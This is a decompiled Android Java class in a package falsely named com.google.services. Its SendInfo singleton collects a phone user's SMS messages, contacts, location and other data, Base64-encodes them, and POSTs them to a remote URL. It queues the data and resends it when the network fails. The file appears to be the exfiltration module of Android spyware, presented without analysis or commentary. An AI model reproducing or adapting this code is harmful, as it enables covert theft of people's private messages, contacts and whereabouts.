package com.google.services;

import android.util.Log;
import it.sauronsoftware.base64.Base64;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class SendInfo {
    private static SendInfo test = null;
    String contact = "";
    String location = "";
    boolean okFlag = false;
    String other = "";
    String sms = "";
    String urlstr = null;

    private SendInfo() {
    }

    public static SendInfo getInstance() {
        if (test == null) {
            test = new SendInfo();
        }
        return test;
    }

    public boolean sendInfo(String str, String str2) {
        if (this.urlstr.equals(null)) {
            Log.i("sendInfo", "网络不通  nullurl");
            if (str.equals("sms")) {
                this.sms += ";" + str2;
            }
            if (str.equals("contact")) {
                this.contact += ";" + str2;
            }
            if (str.equals("location")) {
                this.location += ";" + str2;
            }
            if (!str.equals("other")) {
                return false;
            }
            this.other += ";" + str2;
            return false;
        }
        try {
            if (str.equals("sms") || str.equals("contact") || str.equals("location") || str.equals("other")) {
                run(str, Base64.encode(str2, "UTF-8"));
            } else {
                run(str, str2);
            }
            if (this.okFlag) {
                return true;
            }
            if (str.equals("sms")) {
                this.sms += ";" + str2;
            }
            if (str.equals("contact")) {
                this.contact += ";" + str2;
            }
            if (str.equals("location")) {
                this.location += ";" + str2;
            }
            if (!str.equals("other")) {
                return false;
            }
            this.other += ";" + str2;
            return false;
        } catch (Exception e) {
            Log.i("sendInfo", "网络不通  exception");
            if (str.equals("sms")) {
                this.sms += ";" + str2;
            }
            if (str.equals("contact")) {
                this.contact += ";" + str2;
            }
            if (str.equals("location")) {
                this.location += ";" + str2;
            }
            if (!str.equals("other")) {
                return false;
            }
            this.other += ";" + str2;
            return false;
        }
    }

    public void chuli() {
        if (!"".equals(this.sms) && reSendInfo("sms", Base64.encode(this.sms, "UTF-8"))) {
            this.sms = "";
        }
        if (!"".equals(this.contact)) {
            Log.i("contact重发", this.contact);
            if (reSendInfo("contact", Base64.encode(this.contact, "UTF-8"))) {
                this.contact = "";
            }
        }
        if (!"".equals(this.location) && reSendInfo("location", Base64.encode(this.location, "UTF-8"))) {
            this.location = "";
        }
        if (!"".equals(this.other) && reSendInfo("other", Base64.encode(this.other, "UTF-8"))) {
            this.other = "";
        }
    }

    /* access modifiers changed from: 0000 */
    public boolean reSendInfo(String str, String str2) {
        if (this.urlstr.equals(null)) {
            Log.i("sendInfo", "网络不通");
            return false;
        }
        try {
            HttpPost httpPost = new HttpPost(this.urlstr);
            ArrayList arrayList = new ArrayList();
            arrayList.add(new BasicNameValuePair(str.toString(), str2.toString()));
            httpPost.setEntity(new UrlEncodedFormEntity(arrayList, "UTF-8"));
            DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
            defaultHttpClient.getParams().setParameter("http.connection.timeout", Integer.valueOf(6000));
            defaultHttpClient.getParams().setParameter("http.socket.timeout", Integer.valueOf(6000));
            if (defaultHttpClient.execute(httpPost).getStatusLine().getStatusCode() == 200) {
                return true;
            }
            Log.i("sendInfo", "网络不通");
            return false;
        } catch (Exception e) {
            Log.i("sendInfo", "网络不通");
            return false;
        }
    }

    public synchronized void run(String str, String str2) {
        HttpPost httpPost = new HttpPost(this.urlstr);
        ArrayList arrayList = new ArrayList();
        arrayList.add(new BasicNameValuePair(str.toString(), str2.toString()));
        try {
            this.okFlag = false;
            httpPost.setEntity(new UrlEncodedFormEntity(arrayList, "UTF-8"));
            DefaultHttpClient defaultHttpClient = new DefaultHttpClient();
            defaultHttpClient.getParams().setParameter("http.connection.timeout", Integer.valueOf(10000));
            defaultHttpClient.getParams().setParameter("http.socket.timeout", Integer.valueOf(10000));
            if (defaultHttpClient.execute(httpPost).getStatusLine().getStatusCode() == 200) {
                this.okFlag = true;
            }
        } catch (UnsupportedEncodingException e) {
            Log.i("sendInfo", "网络不通");
        } catch (ClientProtocolException e2) {
            Log.i("sendInfo", "网络不通");
        } catch (IOException e3) {
            Log.i("sendInfo", "网络不通");
        }
        return;
    }
}
